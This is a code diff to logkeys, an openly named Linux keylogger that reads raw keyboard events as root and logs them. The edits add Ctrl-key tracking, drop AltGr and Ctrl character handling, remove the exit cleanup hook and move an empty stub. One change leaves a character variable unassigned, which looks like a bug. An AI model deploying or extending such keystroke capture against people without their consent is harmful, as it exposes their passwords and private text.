@@ -63,6 +63,10 @@ namespace logkeys {
 
 	tree<wchar_t> tr;
 
+	void to_tree(wchar_t theChar){
+	
+	}
+
 	// executes cmd and returns string ouput
 	std::string execute(const char* cmd){
 		FILE* pipe = popen(cmd, "r");
@@ -76,11 +80,6 @@ namespace logkeys {
 		pclose(pipe);
 		return result;
 	}
-
-	void to_tree(wchar_t theChar){
-	
-	}
-
 
 	int input_fd = -1;  // input event device file descriptor; global so that signal_handler() can access it
 
@@ -98,7 +97,7 @@ namespace logkeys {
 				strstr(locale, "utf-8") != NULL || strstr(locale, "utf8") != NULL) );  // if locale has "UTF-8" in its name, it is cool to do nothing
 			else
 				error(EXIT_FAILURE, 0, "LC_CTYPE locale must be of UTF-8 type, or you need en_US.UTF-8 availabe");
-			}
+		}
 	}
 
 	void create_PID_file(){
@@ -287,8 +286,6 @@ namespace logkeys {
 
 
 	int main(int argc, char **argv){
-		on_exit(exit_cleanup, NULL);
-
 		if (geteuid()) error(EXIT_FAILURE, errno, "Got r00t?");
 
 		args.logfile = (char*) DEFAULT_LOG_FILE;  // default log file will be used if none specified
@@ -458,16 +455,12 @@ namespace logkeys {
 					shift_in_effect = true;
 				if (scan_code == KEY_RIGHTALT)
 					altgr_in_effect = true;
+				if (scan_code == KEY_LEFTCTRL || scan_code == KEY_RIGHTCTRL)
+					ctrl_in_effect = true;
 				if (is_char_key(scan_code)) {
 					wchar_t wch;
-					if (altgr_in_effect) {
-						wch = altgr_keys[to_char_keys_index(scan_code)];
-						if (wch == L'\0') {
-							if(shift_in_effect)
-								wch = shift_keys[to_char_keys_index(scan_code)];
-							else
-								wch = char_keys[to_char_keys_index(scan_code)];
-						}
+					if (altgr_in_effect || ctrl_in_effect) {
+						//Don't need keys
 					} 
 					else if (shift_in_effect) {
 						wch = shift_keys[to_char_keys_index(scan_code)];
@@ -505,6 +498,8 @@ namespace logkeys {
 					shift_in_effect = false;
 				if (scan_code == KEY_RIGHTALT)
 					altgr_in_effect = false;
+				if (scan_code == KEY_RIGHTCTRL || scan_code == KEY_LEFTCTRL)
+					ctrl_in_effect = false;
 			}
 
 			prev_code = scan_code;
